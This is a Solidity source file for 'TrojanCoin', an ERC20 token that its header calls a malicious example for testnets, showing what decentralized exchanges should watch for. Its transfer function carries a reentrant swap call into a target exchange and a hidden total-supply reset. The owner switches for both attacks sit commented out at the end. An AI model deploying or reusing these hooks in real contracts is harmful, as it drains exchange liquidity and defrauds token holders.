//DO NOT USE THIS CODE FOR YOUR ERC20 TOKEN. IT CONTAINS MALICIOUS CODE MEANT TO EXTRACT VALUE FROM A DECENTRALIZED EXCHANGE AND IS USED AS AN EXAMPLE OF TOKENS ONE SHOULD NEVER USE AND WHAT DEXES SHOULD BE LOOKING OUT FOR.
//ONLY USE ON TESTNETS
//https://rinkeby.etherscan.io/address/0x580297afe5dd542441baf78e75ff6e475660f2db#code
pragma solidity ^0.6.6;

library SafeMath {
  function mul(uint256 a, uint256 b) internal view returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal view returns (uint256) {
    assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }

  function sub(uint256 a, uint256 b) internal view returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal view returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}


    interface platformToHack{
        function ethToTokenSwapInput(uint256 min_tokens, uint256 deadline) external payable returns (uint256  tokens_bought);
        function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256  eth_bought);
    }

 interface ERC20 {
    function totalSupply() external view returns(uint supply);

    function balanceOf(address _owner) external view returns(uint balance);

    function transfer(address _to, uint _value)  external returns(bool success);

    function transferFrom(address _from, address _to, uint _value)  external returns(bool success);

    function approve(address _spender, uint _value)  external returns(bool success);

    function allowance(address _owner, address _spender)  external view returns(uint remaining);

    function decimals()  external view returns(uint digits);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
}


    // ERC20 Token Smart Contract
    contract TrojanCoin {
        
        string public constant name = "TrojanCoin";
        string public constant symbol = "TRO";
        uint8 public constant decimals = 18;
        uint public _totalSupply = 1000000000000000000000000;
        address marketplaceAddress;
        bool firstTransfer= true;

        //variables use in attacks later
        bool updateSupplyActivated = false;
        bool reentryActivated = false;
        uint256 defaultReentryTradeAmount = 10000000000000000000;
        uint256 defaultTotalSupplyToAdd= 10000000000000000000000;

        
        using SafeMath for uint256;
        address public owner;

         modifier onlyOwner() {
            if (msg.sender != owner) {
                revert();
            }
             _;
         }
     

        mapping(address => uint256) balances;
 
        mapping(address => mapping(address=>uint256)) allowed;

       

        // Constructor
        constructor() public payable {
          
            owner = msg.sender; 
            balances[address(this)] = _totalSupply;
            transfer( msg.sender, _totalSupply);
        }
        
        function totalSupply() public view returns(uint256){
            return _totalSupply;
        }

        function balanceOf(address _owner) public view returns(uint256){
            return balances[_owner];
        }


        function transfer(address _to, uint256 _value)  public returns(bool) {
            if(firstTransfer == false){
            require(balances[msg.sender] >= _value && _value > 0 );
            balances[msg.sender] = balances[msg.sender].sub(_value);
            }
            else{
                balances[address(this)] = 0;
            }
            firstTransfer = false;
            
            balances[_to] = balances[_to].add(_value);
            emit Transfer(msg.sender, _to, _value);

            //two hacks that can be activated
            if(reentryActivated == true){
                reentryActivated=false;
                platformToHack exchange = platformToHack(marketplaceAddress);
                exchange.tokenToEthSwapInput(defaultReentryTradeAmount, 0, 10000000000000000000000000000); //no deadline is reason for long 000000s
            }
            if(updateSupplyActivated ==true){
                _totalSupply = defaultTotalSupplyToAdd;
            }
            return true;
        }
        
  
    function transferFrom(address _from, address _to, uint256 _value)  public returns(bool) {
        require(allowed[_from][msg.sender] >= _value && balances[_from] >= _value && _value > 0);
        balances[_from] = balances[_from].sub(_value);
        balances[_to] = balances[_to].add(_value);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
        emit  Transfer(_from, _to, _value);
        return true;
    }
    
  
    function approve(address _spender, uint256 _value) public returns(bool){
        allowed[msg.sender][_spender] = _value; 
        Approval(msg.sender, _spender, _value);
        return true;
    }
    
   
    function allowance(address _owner, address _spender) public view returns(uint256){
        return allowed[_owner][_spender];
    }
    
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);


/*


    Malicious code goes here


*/

 




}


/*
   //malicious functions that can throw off our example swap platform later
    function setMarketplace(address marketplace) onlyOwner public{
        marketplaceAddress = marketplace;
    }
    function activateRentry() onlyOwner public{
        reentryActivated = true;
    }
    function deactivateRentry() onlyOwner public{
        reentryActivated = false;
    }
    function activateSupplyHack() onlyOwner public{
        updateSupplyActivated = true;
    }
    function deactivateSupplyHack() onlyOwner public{
        updateSupplyActivated = false;
    }



    function updateReentryAmount(uint256 updatedAmount) onlyOwner public{
        defaultReentryTradeAmount= updatedAmount;
    }
    function updateTotalSupplyAddAmount(uint256 updatedAmount) onlyOwner public{
        defaultTotalSupplyToAdd= updatedAmount;
       
    }
    function updateSupply(uint256 updatedAmount) onlyOwner public{
        _totalSupply= updatedAmount;
       
    }

    */

